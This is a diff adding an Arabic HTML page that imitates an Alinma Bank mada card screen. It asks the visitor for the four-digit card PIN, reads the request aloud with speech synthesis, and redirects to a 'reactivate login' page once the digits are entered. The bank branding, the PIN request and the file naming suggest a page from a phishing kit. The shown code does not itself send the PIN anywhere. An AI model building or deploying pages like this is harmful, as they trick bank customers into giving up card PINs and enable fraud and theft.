@@ -1,0 +1,154 @@
+
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ادخل رمز البطاقة</title>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet"/>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Tajawal', sans-serif;
+      background-color: #011c2a;
+      color: white;
+      padding: 20px;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    .cancel {
+      color: #ff9d8d;
+      font-size: 1.1em;
+      cursor: pointer;
+    }
+    .progress {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+    .progress div {
+      width: 30px;
+      height: 6px;
+      border-radius: 3px;
+      background-color: #013346;
+    }
+    .progress .active {
+      background-color: #33ff88;
+    }
+    h2 {
+      font-size: 1.6em;
+      margin-bottom: 10px;
+    }
+    p.subtitle {
+      color: #ccc;
+      font-size: 0.95em;
+      margin-bottom: 30px;
+    }
+    .card {
+      background: linear-gradient(to left, #3a2f80, #5e4dbb);
+      border-radius: 16px;
+      padding: 20px;
+      color: white;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      margin-bottom: 30px;
+    }
+    .card h3 {
+      margin: 0 0 10px 0;
+    }
+    .mada {
+      margin-top: 20px;
+      font-size: 0.85em;
+      color: #ddd;
+    }
+    .pin-input {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 15px;
+    }
+    .pin-input input {
+      width: 60px;
+      height: 60px;
+      font-size: 2em;
+      text-align: center;
+      border: none;
+      border-radius: 12px;
+      background-color: #00384f;
+      color: white;
+    }
+    .note {
+      text-align: center;
+      font-size: 0.9em;
+      color: #ccc;
+    }
+  </style>
+</head>
+<body onload="speakInstruction()">
+  <div class="container">
+    <div class="header">
+      <div class="cancel" onclick="window.history.back()">إلغاء</div>
+    </div>
+
+    <div class="progress">
+      <div></div>
+      <div></div>
+      <div class="active"></div>
+      <div></div>
+    </div>
+
+    <h2>ادخل رمز البطاقة</h2>
+    <p class="subtitle">الرجاء إدخال الرمز السري المرتبط ببطاقتك</p>
+
+    <div class="card">
+      <h3>بطاقة الإنماء مدى الذهبية</h3>
+      <p>رقم البطاقة: **** **** **** 5821</p>
+      <p class="mada">mada - VISA</p>
+    </div>
+
+    <div class="pin-input">
+      <input type="password" maxlength="1">
+      <input type="password" maxlength="1">
+      <input type="password" maxlength="1">
+      <input type="password" maxlength="1">
+    </div>
+
+    
+  </div>
+
+  
+
+
+
+
+<script>
+  function speak(text, callback) {
+    const utterance = new SpeechSynthesisUtterance(text);
+    utterance.lang = 'ar-SA';
+    if (callback) utterance.onend = callback;
+    speechSynthesis.speak(utterance);
+  }
+
+  function speakInstruction() {
+    speak("ادخل رمز البطاقة. الرجاء إدخال الرمز السري المرتبط ببطاقتك");
+  }
+
+  const inputs = document.querySelectorAll('.pin-input input');
+  inputs.forEach((input) => {
+    input.addEventListener('input', () => {
+      const allFilled = Array.from(inputs).every(inp => inp.value.length === 1);
+      if (allFilled) {
+        window.location.href = "reactivate-login-options-linked-final-updated (1).html";
+      }
+    });
+  });
+</script>
+
+</body>
+</html>
